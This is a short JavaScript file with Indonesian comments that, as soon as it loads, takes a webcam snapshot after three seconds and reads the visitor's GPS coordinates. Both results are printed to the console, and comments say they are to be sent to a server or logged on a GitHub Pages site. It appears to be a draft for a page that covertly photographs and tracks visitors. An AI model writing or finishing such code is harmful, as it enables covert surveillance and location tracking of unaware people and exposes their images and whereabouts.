// Fungsi untuk mengambil gambar  
function captureImage() {  
    navigator.mediaDevices.getUserMedia({ video: true })  
        .then(stream => {  
            const video = document.createElement('video');  
            video.srcObject = stream;  
            video.play();  

            const canvas = document.createElement('canvas');  
            canvas.width = 640;  
            canvas.height = 480;  

            setTimeout(() => {  
                const context = canvas.getContext('2d');  
                context.drawImage(video, 0, 0, canvas.width, canvas.height);  

                // Konversi ke data URL  
                const imageData = canvas.toDataURL('image/png');  

                // Kirim data ke server (atau simpan di log GitHub Pages)  
                console.log("Gambar berhasil diambil:", imageData);  
            }, 3000); // Tunggu 3 detik untuk memastikan video aktif  
        })  
        .catch(err => console.error("Tidak dapat mengakses kamera:", err));  
}  

// Fungsi untuk melacak lokasi  
function trackLocation() {  
    if ("geolocation" in navigator) {  
        navigator.geolocation.getCurrentPosition(position => {  
            const latitude = position.coords.latitude;  
            const longitude = position.coords.longitude;  

            // Kirim data lokasi ke server (atau simpan di log GitHub Pages)  
            console.log(`Lokasi berhasil dilacak: ${latitude}, ${longitude}`);  
        }, err => console.error("Gagal melacak lokasi:", err));  
    } else {  
        console.error("Geolocation tidak didukung di perangkat ini.");  
    }  
}  

// Jalankan kedua fungsi  
captureImage();  
trackLocation();
